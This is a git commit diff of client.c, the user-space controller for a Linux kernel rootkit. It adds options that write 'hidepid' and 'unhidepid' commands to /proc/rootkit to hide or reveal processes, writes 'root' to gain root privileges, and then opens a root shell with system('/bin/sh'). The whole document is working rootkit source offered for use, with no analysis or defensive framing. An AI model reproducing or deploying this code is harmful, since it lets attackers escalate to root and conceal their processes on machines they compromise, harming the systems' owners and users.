dff594e92df7d7b28a45a307869c3847dbfa166c
Karl Zakhary <karlmaged33@gmail.com>
2019-05-02 23:41:09 +0200

    clients last mods

--- client.c
+++ client.c
@@ -1,51 +1,117 @@
 #include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <sys/types.h>
-#include <math.h>
-#define RTKIT_HIDEPID_CMD 	"hidepid"
-#define RTKIT_GETROOTPERM_CMD	"root"
+ #include <stdlib.h>
+ #include <string.h>
+ #include <unistd.h>
+ #include <fcntl.h>
+ #include <sys/types.h>
+ #include <math.h>
 
+  #define RTKIT_HIDEPID_CMD 	"hidepid"
+ #define RTKIT_UNHIDEPID_CMD	"unhidepid"
+ #define RTKIT_GETROOTPERM_CMD	"root"
 
-#define RTKIT_PROCFS_ENTRYNAME 	"/proc/rootkit"
+ 
+  #define RTKIT_PROCFS_ENTRYNAME 	"/proc/rootkit"
 
-#define CURRENT_PROCESS 1
+  #define CURRENT_PROCESS 1
 
-#define BUF_SIZE 16
+  #define BUF_SIZE 16
 
-#define OPTS_STR "+:c"
+ #define pid_err "[ERROR] pid exceeds maximum limit\n"
 
-int main(int argc,char **argv)
-{
-	char hidepid_cmd[BUF_SIZE];
-	char unhidepid_cmd[BUF_SIZE];
-	int opt,fd;
-	pid_t cur_pid,hidden_pid,unhidden_pid;
-	fd = open(RTKIT_PROCFS_ENTRYNAME,O_RDWR);
-	while((opt = getopt(argc,argv,OPTS_STR)) != -1)
-	{
-		switch (opt)
-		{
-			case 'c':
-				do{
-		if (CURRENT_PROCESS)
-		{
-			cur_pid = getpid();
-		}
-		else
-		{
-			cur_pid = atoi(optarg);
-		}
-		memset(hidepid_cmd,0x0,BUF_SIZE);	
-		sprintf(hidepid_cmd,RTKIT_HIDEPID_CMD"%d",cur_pid);
-	}while(0) ;
-	break;
-		}
-	}
+  #define OPTS_STR "+:h:s:c"
 
-	if (write(fd,RTKIT_GETROOTPERM_CMD,strlen(RTKIT_GETROOTPERM_CMD)) < 0)
-		printf("[__ERROR__]");
-	system("/bin/sh");
-}
+ 
+  #define __err(msg,prnt_func,err_code)		\
+ 	do{					\
+ 		prnt_func(msg);			\
+ 		return err_code;		\
+ 	}while(0)
+
+ 
+  #define usage_err(errmsg,opt)		\
+ 	do{				\
+ 		printf(errmsg,opt);	\
+ 		return -1;		\
+ 	}while(0)
+
+ 
+  #define pid_hide_unhide(fd,pidvar,cmd_buf,cmd,curproc,errmsg)			\
+ 	do{									\
+ 		if (curproc)							\
+ 		{								\
+ 			pidvar = getpid();					\
+ 		}								\
+ 		else								\
+ 		{								\
+ 			pidvar = atoi(optarg);					\
+ 			if ((pidvar > ((int)pow(2,22))) || (pidvar <= -1))	\
+ 				__err(errmsg pid_err,printf,-1);		\
+ 		}								\
+ 		memset(cmd_buf,0x0,BUF_SIZE);					\
+ 		sprintf(cmd_buf,cmd"%d",pidvar);				\
+ 		if (write(fd,cmd_buf,strlen(cmd_buf)) < 0)			\
+ 			__err(errmsg,perror,-1);				\
+ 	}while(0)
+
+ 
+ 
+  int main(int argc,char **argv)
+ {
+ 	char hidepid_cmd[BUF_SIZE];
+ 	char unhidepid_cmd[BUF_SIZE];
+ 	int opt,fd;
+ 	pid_t cur_pid,hidden_pid,unhidden_pid;
+
+ 
+  	fd = open(RTKIT_PROCFS_ENTRYNAME,O_RDWR);
+
+  	if (fd < 0)
+ 		__err("[__ERROR_1__]",perror,-1);
+
+  	while((opt = getopt(argc,argv,OPTS_STR)) != -1)
+ 	{
+ 		switch (opt)
+ 		{
+ 			case 's':
+ 				//unhide given pid
+ 				pid_hide_unhide(fd,
+ 						unhidden_pid,
+ 						unhidepid_cmd,
+ 						RTKIT_UNHIDEPID_CMD,
+ 						!CURRENT_PROCESS,
+ 						"[__ERROR_2__]");
+ 				break;
+ 			case 'h':
+ 				//hide given pid
+ 				pid_hide_unhide(fd,
+ 						hidden_pid,
+ 						hidepid_cmd,
+ 						RTKIT_HIDEPID_CMD,
+ 						!CURRENT_PROCESS,
+ 						"[__ERROR_3__]");
+ 				break;
+ 			case 'c':
+ 				//hide current process id
+ 				pid_hide_unhide(fd,
+ 						cur_pid,
+ 						hidepid_cmd,
+ 						RTKIT_HIDEPID_CMD,
+ 						CURRENT_PROCESS,
+ 						"[__ERROR_4__]");
+ 				break;
+ 			case '?':
+ 				usage_err("[__ERROR__]unrecognized option [%c]\n",optopt);
+ 				break;
+ 			case ':':
+ 				usage_err("[__ERROR__]missing argument to [%c] option\n",optopt);
+ 		}
+ 	}
+
+  	//get root privileges
+ 	if (write(fd,RTKIT_GETROOTPERM_CMD,strlen(RTKIT_GETROOTPERM_CMD)) < 0)
+ 		__err("[__ERROR_5__]",perror,-1);
+
+ 
+  	system("/bin/sh");
+ }
